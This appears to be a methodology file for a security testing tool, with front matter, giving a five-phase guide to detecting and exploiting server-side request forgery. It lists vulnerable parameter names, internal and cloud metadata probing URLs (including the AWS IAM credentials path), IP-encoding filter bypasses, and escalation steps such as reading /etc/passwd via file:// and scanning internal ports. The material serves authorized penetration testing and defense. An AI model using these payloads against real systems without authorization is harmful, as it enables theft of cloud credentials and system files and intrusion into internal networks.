---
name: ssrf-detection
category: injection
description: Server-Side Request Forgery detection and exploitation
attack_types:
  - ssrf
  - injection
severity_range: [high, critical]
---

# SSRF Detection & Exploitation

## Phase 1: Identify SSRF Entry Points
- URL parameters: `url=`, `redirect=`, `next=`, `dest=`, `uri=`, `path=`, `window=`, `data=`, `reference=`, `site=`, `html=`, `val=`, `validate=`, `domain=`, `callback=`, `feed=`, `host=`, `port=`, `to=`, `out=`, `view=`, `dir=`
- File inclusion parameters: `file=`, `document=`, `folder=`, `root=`, `pg=`, `style=`, `pdf=`, `template=`, `php_path=`, `doc=`
- Import/export functions: PDF generators, image processors, webhook URLs
- API integrations: OAuth callbacks, payment webhooks

## Phase 2: Internal Network Probing
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://169.254.169.254/latest/meta-data/  (AWS)
http://metadata.google.internal/computeMetadata/v1/  (GCP)
http://169.254.169.254/metadata/instance  (Azure)
```

## Phase 3: Bypass Techniques
- DNS rebinding: Use controlled domain resolving to internal IP
- URL parsing inconsistencies: `http://127.1`, `http://0x7f000001`, `http://2130706433`
- Decimal IP: `http://2130706433` = 127.0.0.1
- IPv6 mapping: `http://[::ffff:127.0.0.1]`
- URL encoding: `http://%31%32%37%2e%30%2e%30%2e%31`
- Redirect chain: External URL → 302 → internal
- DNS rebinding with short TTL

## Phase 4: Cloud Metadata Exploitation
- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- AWS IMDSv2: Requires `X-aws-ec2-metadata-token` header
- GCP: Requires `Metadata-Flavor: Google` header
- Azure: Requires `Metadata: true` header
- DigitalOcean: `http://169.254.169.254/metadata/v1/`

## Phase 5: Confirm & Escalate
- Out-of-band detection: Use callback server to confirm blind SSRF
- Port scanning: Enumerate internal services via response time/size differences
- File read: `file:///etc/passwd` via file:// protocol
- Internal API access: Hit internal admin/debug endpoints
